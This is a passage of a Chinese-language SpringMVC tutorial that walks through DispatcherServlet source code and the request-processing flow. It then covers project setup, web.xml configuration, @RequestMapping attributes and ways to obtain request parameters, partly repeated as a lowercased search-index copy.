通过反射创建 IOC 容器对象\n    ConfigurableWebApplicationContext wac =\n        (ConfigurableWebApplicationContext) BeanUtils.instantiateClass(contextClass);\n\n    wac.setEnvironment(getEnvironment());\n    // 设置父容器\n    wac.setParent(parent);\n    String configLocation = getContextConfigLocation();\n    if (configLocation != null) {\n        wac.setConfigLocation(configLocation);\n    }\n    configureAndRefreshWebApplicationContext(wac);\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# DispatcherServlet初始化策略\n\nFrameworkServlet创建WebApplicationContext后，刷新容器，调用onRefresh(wac)，此方法在DispatcherServlet中进行了重写，调用了initStrategies(context)方法，初始化策略，即初始化DispatcherServlet的各个组件 所在类：org.springframework.web.servlet.DispatcherServlet\n\nprotected void initStrategies(ApplicationContext context) {\n   initMultipartResolver(context);\n   initLocaleResolver(context);\n   initThemeResolver(context);\n   initHandlerMappings(context);\n   initHandlerAdapters(context);\n   initHandlerExceptionResolvers(context);\n   initRequestToViewNameTranslator(context);\n   initViewResolvers(context);\n   initFlashMapManager(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# DispatcherServlet调用组件处理请求\n\n# processRequest()\n\nFrameworkServlet重写HttpServlet中的service()和doXxx()，这些方法中调用了processRequest(request, response) 所在类：org.springframework.web.servlet.FrameworkServlet\n\nprotected final void processRequest(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n\n    long startTime = System.currentTimeMillis();\n    Throwable failureCause = null;\n\n    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();\n    LocaleContext localeContext = buildLocaleContext(request);\n\n    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();\n    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, response, previousAttributes);\n\n    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);\n    asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), new RequestBindingInterceptor());\n\n    initContextHolders(request, localeContext, requestAttributes);\n\n    try {\n        // 执行服务，doService()是一个抽象方法，在DispatcherServlet中进行了重写\n        doService(request, response);\n    }\n    catch (ServletException | IOException ex) {\n        failureCause = ex;\n        throw ex;\n    }\n    catch (Throwable ex) {\n        failureCause = ex;\n        throw new NestedServletException("Request processing failed", ex);\n    }\n\n    finally {\n        resetContextHolders(request, previousLocaleContext, previousAttributes);\n        if (requestAttributes != null) {\n            requestAttributes.requestCompleted();\n        }\n        logResult(request, response, failureCause, asyncManager);\n        publishRequestHandledEvent(request, response, startTime, failureCause);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n# doService()\n\n所在类：org.springframework.web.servlet.DispatcherServlet\n\n@Override\nprotected void doService(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    logRequest(request);\n\n    // Keep a snapshot of the request attributes in case of an include,\n    // to be able to restore the original attributes after the include.\n    Map<String, Object> attributesSnapshot = null;\n    if (WebUtils.isIncludeRequest(request)) {\n        attributesSnapshot = new HashMap<>();\n        Enumeration<?> attrNames = request.getAttributeNames();\n        while (attrNames.hasMoreElements()) {\n            String attrName = (String) attrNames.nextElement();\n            if (this.cleanupAfterInclude || attrName.startsWith(DEFAULT_STRATEGIES_PREFIX)) {\n                attributesSnapshot.put(attrName, request.getAttribute(attrName));\n            }\n        }\n    }\n\n    // Make framework objects available to handlers and view objects.\n    request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());\n    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, this.localeResolver);\n    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, this.themeResolver);\n    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());\n\n    if (this.flashMapManager != null) {\n        FlashMap inputFlashMap = this.flashMapManager.retrieveAndUpdate(request, response);\n        if (inputFlashMap != null) {\n            request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE, Collections.unmodifiableMap(inputFlashMap));\n        }\n        request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, new FlashMap());\n        request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, this.flashMapManager);\n    }\n\n    RequestPath requestPath = null;\n    if (this.parseRequestPath && !ServletRequestPathUtils.hasParsedRequestPath(request)) {\n        requestPath = ServletRequestPathUtils.parseAndCache(request);\n    }\n\n    try {\n        // 处理请求和响应\n        doDispatch(request, response);\n    }\n    finally {\n        if (!WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) {\n            // Restore the original attribute snapshot, in case of an include.\n            if (attributesSnapshot != null) {\n                restoreAttributesAfterInclude(request, attributesSnapshot);\n            }\n        }\n        if (requestPath != null) {\n            ServletRequestPathUtils.clearParsedRequestPath(request);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n# doDispatch()\n\n所在类：org.springframework.web.servlet.DispatcherServlet\n\nprotected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    HttpServletRequest processedRequest = request;\n    HandlerExecutionChain mappedHandler = null;\n    boolean multipartRequestParsed = false;\n\n    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);\n\n    try {\n        ModelAndView mv = null;\n        Exception dispatchException = null;\n\n        try {\n            processedRequest = checkMultipart(request);\n            multipartRequestParsed = (processedRequest != request);\n\n            // Determine handler for the current request.\n            /*\n                mappedHandler：调用链\n                包含handler、interceptorList、interceptorIndex\n                handler：浏览器发送的请求所匹配的控制器方法\n                interceptorList：处理控制器方法的所有拦截器集合\n                interceptorIndex：拦截器索引，控制拦截器afterCompletion()的执行\n            */\n            mappedHandler = getHandler(processedRequest);\n            if (mappedHandler == null) {\n                noHandlerFound(processedRequest, response);\n                return;\n            }\n\n            // Determine handler adapter for the current request.\n               // 通过控制器方法创建相应的处理器适配器，调用所对应的控制器方法\n            HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());\n\n            // Process last-modified header, if supported by the handler.\n            String method = request.getMethod();\n            boolean isGet = "GET".equals(method);\n            if (isGet || "HEAD".equals(method)) {\n                long lastModified = ha.getLastModified(request, mappedHandler.getHandler());\n                if (new ServletWebRequest(request, response).checkNotModified(lastModified) && isGet) {\n                    return;\n                }\n            }\n\n            // 调用拦截器的preHandle()\n            if (!mappedHandler.applyPreHandle(processedRequest, response)) {\n                return;\n            }\n\n            // Actually invoke the handler.\n            // 由处理器适配器调用具体的控制器方法，最终获得ModelAndView对象\n            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());\n\n            if (asyncManager.isConcurrentHandlingStarted()) {\n                return;\n            }\n\n            applyDefaultViewName(processedRequest, mv);\n            // 调用拦截器的postHandle()\n            mappedHandler.applyPostHandle(processedRequest, response, mv);\n        }\n        catch (Exception ex) {\n            dispatchException = ex;\n        }\n        catch (Throwable err) {\n            // As of 4.3, we\'re processing Errors thrown from handler methods as well,\n            // making them available for @ExceptionHandler methods and other scenarios.\n            dispatchException = new NestedServletException("Handler dispatch failed", err);\n        }\n        // 后续处理：处理模型数据和渲染视图\n        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);\n    }\n    catch (Exception ex) {\n        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);\n    }\n    catch (Throwable err) {\n        triggerAfterCompletion(processedRequest, response, mappedHandler,\n                               new NestedServletException("Handler processing failed", err));\n    }\n    finally {\n        if (asyncManager.isConcurrentHandlingStarted()) {\n            // Instead of postHandle and afterCompletion\n            if (mappedHandler != null) {\n                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);\n            }\n        }\n        else {\n            // Clean up any resources used by a multipart request.\n            if (multipartRequestParsed) {\n                cleanupMultipart(processedRequest);\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n\n\n# processDispatchResult()\n\nprivate void processDispatchResult(HttpServletRequest request, HttpServletResponse response,\n                                   @Nullable HandlerExecutionChain mappedHandler, @Nullable ModelAndView mv,\n                                   @Nullable Exception exception) throws Exception {\n\n    boolean errorView = false;\n\n    if (exception != null) {\n        if (exception instanceof ModelAndViewDefiningException) {\n            logger.debug("ModelAndViewDefiningException encountered", exception);\n            mv = ((ModelAndViewDefiningException) exception).getModelAndView();\n        }\n        else {\n            Object handler = (mappedHandler != null ? mappedHandler.getHandler() : null);\n            mv = processHandlerException(request, response, handler, exception);\n            errorView = (mv != null);\n        }\n    }\n\n    // Did the handler return a view to render?\n    if (mv != null && !mv.wasCleared()) {\n        // 处理模型数据和渲染视图\n        render(mv, request, response);\n        if (errorView) {\n            WebUtils.clearErrorRequestAttributes(request);\n        }\n    }\n    else {\n        if (logger.isTraceEnabled()) {\n            logger.trace("No view rendering, null ModelAndView returned.");\n        }\n    }\n\n    if (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) {\n        // Concurrent handling started during a forward\n        return;\n    }\n\n    if (mappedHandler != null) {\n        // Exception (if any) is already handled..\n        // 调用拦截器的afterCompletion()\n        mappedHandler.triggerAfterCompletion(request, response, null);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# SpringMVC的执行流程\n\n用户向服务器发送请求，请求被SpringMVC 前端控制器 DispatcherServlet捕获。 DispatcherServlet对请求URL进行解析，得到请求资源标识符（URI），判断请求URI对应的映射：\n\n 1. 不存在 i. 再判断是否配置了mvc:default-servlet-handler ii. 如果没配置，则控制台报映射查找不到，客户端展示404错误\n\n\n\niii. 如果有配置，则访问目标资源（一般为静态资源，如：JS,CSS,HTML），找不到客户端也会展示404错误\n\n\n\n 2. 存在则执行下面的流程\n    \n    根据该URI，调用HandlerMapping获得该Handler配置的所有相关的对象（包括Handler对象以及Handler对象对应的拦截器），最后以HandlerExecutionChain执行链对象的形式返回。\n    \n    DispatcherServlet 根据获得的Handler，选择一个合适的HandlerAdapter。\n    \n    如果成功获得HandlerAdapter，此时将开始执行拦截器的preHandler(…)方法【正向】\n    \n    提取Request中的模型数据，填充Handler入参，开始执行Handler（Controller)方法，处理请求。在填充Handler的入参过程中，根据你的配置，Spring将帮你做一些额外的工作：\n    \n    a) HttpMessageConveter： 将请求消息（如Json、xml等数据）转换成一个对象，将对象转换为指定的响应信息\n    \n    b) 数据转换：对请求消息进行数据转换。如String转换成Integer、Double等\n    \n    c) 数据格式化：对请求消息进行数据格式化。 如将字符串转换成格式化数字或格式化日期等\n    \n    d) 数据验证： 验证数据的有效性（长度、格式等），验证结果存储到BindingResult或Error中\n    \n    Handler执行完成后，向DispatcherServlet 返回一个ModelAndView对象。\n    \n    此时将开始执行拦截器的postHandle(...)方法【逆向】。\n    \n    根据返回的ModelAndView（此时会判断是否存在异常：如果存在异常，则执行HandlerExceptionResolver进行异常处理）选择一个适合的ViewResolver进行视图解析，根据Model和View，来渲染视图。\n    \n    渲染视图完毕执行拦截器的afterCompletion(…)方法【逆向】。\n    \n    将渲染结果返回给客户端。',normalizedContent:'# springmvc\n\n\n# springmvc简介\n\n\n# 什么是mvc\n\nmvc是一种软件架构的思想，将软件按照模型、视图、控制器来划分\n\nm：model，模型层，指工程中的javabean，作用是处理数据 v：view，视图层，指工程中的html或jsp等页面，作用是与用户进行交互，展示数据 c：controller，控制层，指工程中的servlet，作用是接收请求和响应浏览器\n\nmvc的工作流程： 用户通过视图层发送请求到服务器，在服务器中请求被controller接收，controller调用相应的model层处理请求，处理完毕将结果返回到controller，controller再根据请求处理的结果找到相应的view视图，渲染数据后最终响应给浏览器\n\njavabean分为两类：\n\n * 一类称为实体类bean：专门存储业务数据的，如 student、user 等\n * 一类称为业务处理 bean：指 service 或 dao 对象，专门用于处理业务逻辑和数据访问。\n\n\n# 什么是springmvc\n\nspringmvc是spring的一个后续产品，是spring的一个子项目 springmvc 是 spring 为表述层开发提供的一整套完备的解决方案。在表述层框架历经 strust、webwork、strust2 等诸多产品的历代更迭之后，目前业界普遍选择了 springmvc 作为 java ee 项目表述层开发的首选方案。\n\n> 注：三层架构分为表述层（或表示层）、业务逻辑层、数据访问层，表述层表示前台页面和后台servlet\n\n\n# springmvc的特点\n\n * spring 家族原生产品，与 ioc 容器等基础设施无缝对接\n * 基于原生的servlet，通过了功能强大的前端控制器dispatcherservlet，对请求和响应进行统一处理\n * 表述层各细分领域需要解决的问题全方位覆盖，提供全面解决方案\n * 代码清新简洁，大幅度提升开发效率\n * 内部组件化程度高，可插拔式组件即插即用，想要什么功能配置相应组件即可\n * 性能卓著，尤其适合现代大型、超大型互联网项目要求\n\n\n# mvc开发环境搭建\n\n\n# maven项目创建\n\n创建maven web项目，引入maven依赖\n\n<dependencies>\n    \x3c!-- springmvc --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-webmvc</artifactid>\n        <version>5.3.1</version>\n    </dependency>\n\n    \x3c!-- 日志 --\x3e\n    <dependency>\n        <groupid>ch.qos.logback</groupid>\n        <artifactid>logback-classic</artifactid>\n        <version>1.2.3</version>\n    </dependency>\n\n    \x3c!-- servletapi --\x3e\n    <dependency>\n        <groupid>javax.servlet</groupid>\n        <artifactid>javax.servlet-api</artifactid>\n        <version>3.1.0</version>\n        <scope>provided</scope>\n    </dependency>\n\n    \x3c!-- spring5和thymeleaf整合包 --\x3e\n    <dependency>\n        <groupid>org.thymeleaf</groupid>\n        <artifactid>thymeleaf-spring5</artifactid>\n        <version>3.0.12.release</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# web.xml配置文件\n\n# 默认配置方式\n\n此配置作用下，springmvc的配置文件默认位于web-inf下，默认名称为<servlet-name>-servlet.xml，例如，以下配置所对应springmvc的配置文件位于web-inf下，文件名为springmvc-servlet.xml\n\n\x3c!-- 配置springmvc的前端控制器，对浏览器发送的请求统一进行处理 --\x3e\n<servlet>\n    <servlet-name>springmvc</servlet-name>\n    <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springmvc</servlet-name>\n    \x3c!--\n        设置springmvc的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 扩展配置方式\n\n可通过init-param标签设置springmvc配置文件的位置和名称，通过load-on-startup标签设置springmvc前端控制器dispatcherservlet的初始化时间\n\n\x3c!-- 配置springmvc的前端控制器，对浏览器发送的请求统一进行处理 --\x3e\n<servlet>\n    <servlet-name>springmvc</servlet-name>\n    <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n    \x3c!-- 通过初始化参数指定springmvc配置文件的位置和名称 --\x3e\n    <init-param>\n        \x3c!-- contextconfiglocation为固定值 --\x3e\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- 使用classpath:表示从类路径查找配置文件，例如maven工程中的src/main/resources --\x3e\n        <param-value>classpath:springmvc.xml</param-value>\n    </init-param>\n    \x3c!-- \n         作为框架的核心组件，在启动过程中有大量的初始化操作要做\n        而这些操作放在第一次请求时才执行会严重影响访问速度\n        因此需要通过此标签将启动控制dispatcherservlet的初始化时间提前到服务器启动时\n    --\x3e\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springmvc</servlet-name>\n    \x3c!--\n        设置springmvc的核心控制器所能处理的请求的请求路径\n        /所匹配的请求可以是/login或.html或.js或.css方式的请求路径\n        但是/不能匹配.jsp请求路径的请求\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n&lt;url-pattern>标签中使用/和/*的区别：\n所匹配的请求可以是/login或.html或.js或.css方式的请求路径，但是/不能匹配.jsp请求路径的请求。因此就可以避免在访问jsp页面时，该请求被dispatcherservlet处理，从而找不到相应的页面\n/* 则能够匹配所有请求，例如在使用过滤器时，若需要对所有请求进行过滤，就需要使用/\\*的写法\n\n\n1\n2\n3\n\n\n\n# 创建请求控制器\n\n由于前端控制器对浏览器发送的请求进行了统一的处理，但是具体的请求有不同的处理过程，因此需要创建处理具体请求的类，即请求控制器\n\n请求控制器中每一个处理请求的方法成为控制器方法\n\n因为springmvc的控制器由一个pojo（普通的java类）担任，因此需要通过@controller注解将其标识为一个控制层组件，交给spring的ioc容器管理，此时springmvc才能够识别控制器的存在\n\n@controller\npublic class hellocontroller {\n\n}\n\n\n1\n2\n3\n4\n\n\n\n# 创建springmvc配置文件\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="<http://www.springframework.org/schema/beans>"\n       xmlns:xsi="<http://www.w3.org/2001/xmlschema-instance>"\n       xmlns:context="<http://www.springframework.org/schema/context>"\n       xsi:schemalocation="<http://www.springframework.org/schema/beans> <http://www.springframework.org/schema/beans/spring-beans.xsd>\n                            <http://www.springframework.org/schema/context> <http://www.springframework.org/schema/context/spring-context.xsd>">\n\n    <context:component-scan base-package="com.pwddd.mvc" />\n    \x3c!-- 配置thymeleaf视图解析器 --\x3e\n    <bean id="viewresolver" class="org.thymeleaf.spring5.view.thymeleafviewresolver">\n        <property name="order" value="1"/>\n        <property name="characterencoding" value="utf-8"/>\n        <property name="templateengine">\n            <bean class="org.thymeleaf.spring5.springtemplateengine">\n                <property name="templateresolver">\n                    <bean class="org.thymeleaf.spring5.templateresolver.springresourcetemplateresolver">\n\n                        \x3c!-- 视图前缀 --\x3e\n                        <property name="prefix" value="/web-inf/templates/"/>\n\n                        \x3c!-- 视图后缀 --\x3e\n                        <property name="suffix" value=".html"/>\n                        <property name="templatemode" value="html5"/>\n                        <property name="characterencoding" value="utf-8" />\n                    </bean>\n                </property>\n            </bean>\n        </property>\n    </bean>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# 测试\n\n 1. 实现对首页的访问 在请求控制器中创建处理请求的方法\n\n// @requestmapping注解：处理请求和控制器方法之间的映射关系\n// @requestmapping注解的value属性可以通过请求地址匹配请求，/表示的当前工程的上下文路径\n// localhost:8080/springmvc/\n@requestmapping("/")\npublic string index() {\n    //设置视图名称\n    return "index";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. 通过超链接跳转到指定页面 在主页index.html中设置超链接\n\n<!doctype html>\n<html lang="en" xmlns:th="<http://www.thymeleaf.org>">\n<head>\n    <meta charset="utf-8">\n    <title>首页</title>\n</head>\n<body>\n    <h1>首页</h1>\n    <a th:href="@{/hello}">helloworld</a><br/>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n在请求控制器中创建处理请求的方法\n\n@requestmapping("/hello")\npublic string helloworld() {\n    return "target";\n}\n\n\n1\n2\n3\n4\n\n\n\n# 总结\n\n浏览器发送请求，若请求地址符合前端控制器的url-pattern，该请求就会被前端控制器dispatcherservlet处理。前端控制器会读取springmvc的核心配置文件，通过扫描组件找到控制器，将请求地址和控制器中@requestmapping注解的value属性值进行匹配，若匹配成功，该注解所标识的控制器方法就是处理请求的方法。处理请求的方法需要返回一个字符串类型的视图名称，该视图名称会被视图解析器解析，加上前缀和后缀组成视图的路径，通过thymeleaf对视图进行渲染，最终转发到视图所对应页面\n\n\n# requestmapping注解\n\n\n# @requestmapping注解的功能\n\n从注解名称上我们可以看到，@requestmapping注解的作用就是将请求和处理请求的控制器方法关联起来，建立映射关系。 springmvc 接收到指定的请求，就会来找到在映射关系中对应的控制器方法来处理这个请求。\n\n\n# @requestmapping注解的位置\n\n@requestmapping标识一个类：设置映射请求的请求路径的初始信息 @requestmapping标识一个方法：设置映射请求请求路径的具体信息\n\n@controller\n@requestmapping("/test")\npublic class requestmappingcontroller {\n\n    //此时请求映射所映射的请求的请求路径为：/test/testrequestmapping\n    @requestmapping("/testrequestmapping")\n    public string testrequestmapping(){\n        return "success";\n    }\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# @requestmapping注解的value属性\n\n@requestmapping注解的value属性通过请求的请求地址匹配请求映射 @requestmapping注解的value属性是一个字符串类型的数组，表示该请求映射能够匹配多个请求地址所对应的请求 @requestmapping注解的value属性必须设置，至少通过请求地址匹配请求映射\n\n<a th:href="@{/test/testrequestmapping/}" >测试testrequestmapping</a><br>  \n<a th:href="@{/test/test/}" >测试testrequestmapping---test</a><br>\n\n\n1\n2\n\n\n@requestmapping(\n        value = {"/testrequestmapping", "/test"}\n)\npublic string testrequestmapping(){\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# @requestmapping注解的method属性\n\n@requestmapping注解的method属性通过请求的请求方式（get或post）匹配请求映射 @requestmapping注解的method属性是一个requestmethod类型的数组，表示该请求映射能够匹配多种请求方式的请求 若当前请求的请求地址满足请求映射的value属性，但是请求方式不满足method属性，则浏览器报错405：request method \'post\' not supported\n\n<form th:action="@{/test/testmethod}" method="post" >  \n <input type="submit">  \n</form>\n\n\n1\n2\n3\n\n\n@requestmapping(  \n value = {"/testmethod"},  \n method = requestmethod.post  \n)  \npublic string testmethod(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> tips： 1、对于处理指定请求方式的控制器方法，springmvc中提供了@requestmapping的派生注解\n> \n> 处理get请求的映射--\x3e@getmapping\n> \n> 处理post请求的映射--\x3e@postmapping\n> \n> 处理put请求的映射--\x3e@putmapping\n> \n> 处理delete请求的映射--\x3e@deletemapping\n> \n> 2、常用的请求方式有get，post，put，delete\n> \n> 但是目前浏览器只支持get和post，若在form表单提交时，为method设置了其他请求方式的字符串（put或delete），则按照默认的请求方式get处理\n> \n> 若要发送put和delete请求，则需要通过spring提供的过滤器hiddenhttpmethodfilter，在restful部分会讲到。\n\n\n# @requestmapping注解的params属性\n\n@requestmapping注解的params属性通过请求的请求参数匹配请求映射 @requestmapping注解的params属性是一个字符串类型的数组，可以通过四种表达式设置请求参数和请求映射的匹配关系 "param"：要求请求映射所匹配的请求必须携带param请求参数 "!param"：要求请求映射所匹配的请求必须不能携带param请求参数 "param=value"：要求请求映射所匹配的请求必须携带param请求参数且param=value "param!=value"：要求请求映射所匹配的请求必须携带param请求参数但是param!=value\n\n<a th:href="@{/test/testparam(username=\'zhangsan\',password=123456)}" >测试param</a>\n\n\n1\n\n\n@requestmapping(value = "testparam",method = requestmethod.get,params = {"!haha","username=zhangsan"})  \npublic string testparam(){  \n return "success";  \n}\n\n\n1\n2\n3\n4\n\n\n\n\n> 注： 若当前请求满足@requestmapping注解的value和method属性，但是不满足params属性，此时页面回报错400：parameter conditions "username, password!=123456" not met for actual request parameters: username={admin}, password={123456}\n\n\n# @requestmapping注解的headers属性\n\n@requestmapping注解的headers属性通过请求的请求头信息匹配请求映射\n\n@requestmapping注解的headers属性是一个字符串类型的数组，可以通过四种表达式设置请求头信息和请求映射的匹配关系\n\n"header"：要求请求映射所匹配的请求必须携带header请求头信息\n\n"!header"：要求请求映射所匹配的请求必须不能携带header请求头信息\n\n"header=value"：要求请求映射所匹配的请求必须携带header请求头信息且header=value\n\n"header!=value"：要求请求映射所匹配的请求必须携带header请求头信息且header!=value\n\n若当前请求满足@requestmapping注解的value和method属性，但是不满足headers属性，此时页面显示404错误，即资源未找到\n\n\n# springmvc支持ant风格的路径\n\n？：表示任意的单个字符\n\n*：表示任意的0个或多个字符\n\n**：表示任意的一层或多层目录\n\n注意：在使用**时，只能使用/**/xxx的方式\n\n\n# springmvc支持路径中的占位符\n\n原始方式：/deleteuser?id=1\n\nrest方式：/user/1 请求方式为：delete\n\nspringmvc路径中的占位符常用于restful风格中，当请求路径中将某些数据通过路径的方式传输到服务器中，就可以在相应的@requestmapping注解的value属性中通过占位符{xxx}表示传输的数据，在通过@pathvariable注解，将占位符所表示的数据赋值给控制器方法的形参\n\n<a th:href="@{/test/testparam2/1/2/3/4/}" >测试 /1/2/3/4/</a>\n\n\n1\n\n\n@requestmapping(value = "/testparam2/{p1}/{p2}/{p3}/{p4}")  \npublic string testparam2(@pathvariable("p1") string p1,@pathvariable("p2") string p2,@pathvariable("p3") string p3,@pathvariable("p4") string p4){  \n system.out.println(p1+p2+p3+p4);  \n return "success";  \n}\n\n\n1\n2\n3\n4\n5\n\n\n\n# springmvc获取请求参数\n\n\n# 通过servletapi获取\n\n将httpservletrequest作为控制器方法的形参，此时httpservletrequest类型的参数表示封装了当前请求的请求报文的对象\n\n<a th:href="@{/test/testservletreq(username=\'zhangsan\',password=1234)}">测试从servletapi获取参数</a>\n\n\n1\n\n\n@requestmapping("/testservletreq")  \npublic string testservletreq(httpservletrequest request){  \n string username = request.getparameter("username");  \n string password = request.getparameter("password");  \n system.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n// 控制台输出：username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# 通过控制器方法的形参获取请求参数\n\n在控制器方法的形参位置，设置和请求参数同名的形参，当浏览器发送请求，匹配到请求映射时，在dispatcherservlet中就会将请求参数赋值给相应的形参。\n\n<a th:href="@{/test/testcontroller(username=\'zhangsan\',password=1234)}">测试从控制器获取参数</a>\n\n\n1\n\n\n@requestmapping("/testcontroller")  \npublic string testservletreq(string username,string password){  \n system.out.println("username:"+username+": password:"+password);  \n return "success";  \n}\n\n//控制台输出：username:zhangsan: password:1234\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n> 注： 若请求所传输的请求参数中有多个同名的请求参数，此时可以在控制器方法的形参中设置字符串数组或者字符串类型的形参接收此请求参数 若使用字符串数组类型的形参，此参数的数组中包含了每一个数据 若使用字符串类型的形参，此参数的值为每个数据中间使用逗号拼接的结果\n\n\n# @requestparam\n\n@requestparam是将请求参数和控制器方法的形参创建映射关系 @requestparam注解一共有三个属性：\n\n * value：指定为形参赋值的请求参数的参数名\n\n * required：设置是否必须传输此请求参数，默认值为true\n   \n   若设置为true时，则当前请求必须传输value所指定的请求参数，若没有传输该请求参数，且没有设置defaultvalue属性，则页面报错400：required string parameter \'xxx\' is not present；若设置为false，则当前请求不是必须传输value所指定的请求参数，若没有传输，则注解所标识的形参的值为null\n\n * defaultvalue：不管required属性值为true或false，当value所指定的请求参数没有传输或传输的值为""时，则使用默认值为形参赋值\n\n\n# @requestheader\n\n@requestheader是将请求头信息和控制器方法的形参创建映射关系 @requestheader注解一共有三个属性：value、required、defaultvalue，用法同@requestparam\n\n\n# @cookievalue\n\n@cookievalue是将cookie数据和控制器方法的形参创建映射关系 @cookievalue注解一共有三个属性：value、required、defaultvalue，用法同@requestparam\n\n\n# 通过pojo获取请求参数\n\n可以在控制器方法的形参位置设置一个实体类类型的形参，此时若浏览器传输的请求参数的参数名和实体类中的属性名一致，那么请求参数就会为此属性赋值。\n\n<form th:action="@{/test/testentity}" method="post">  \n <input type="text" value="zhangsan" name="username"> <br>  \n <input type="text" value="123456" name="password"> <br>  \n <input type="text" value="email" name="email"> <br>  \n <input type="submit" value="测试实体注入属性">  \n</form>\n\n\n1\n2\n3\n4\n5\n6\n\n\n@requestmapping(value = "/testentity",method = requestmethod.post)  \npublic string testentity(user user){  \n system.out.println(user);  \n return "success";  \n}\n\n// user{id=\'null\', username=\'zhangsan\', password=\'123456\', email=\'email\'}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 解决获取请求参数的乱码问题\n\n乱码问题分为两种，第一种为get请求参数乱码问题，解决办法在 javaweb中提到，可以在tomcat配置文件中配置。第二种为post请求参数乱码，可以配置过滤器进行设置编码格式。 解决获取请求参数的乱码问题，可以使用springmvc提供的编码过滤器characterencodingfilter，但是必须在web.xml中进行注册。\n\n<filter>  \n <filter-name>characterencodingfilter</filter-name>  \n <filter-class>org.springframework.web.filter.characterencodingfilter</filter-class>  \n <init-param>  \n <param-name>encoding</param-name>  \n <param-value>utf-8</param-value>  \n </init-param>  \n <init-param>  \n <param-name>forceresponseencoding</param-name>  \n <param-value>true</param-value>  \n </init-param>  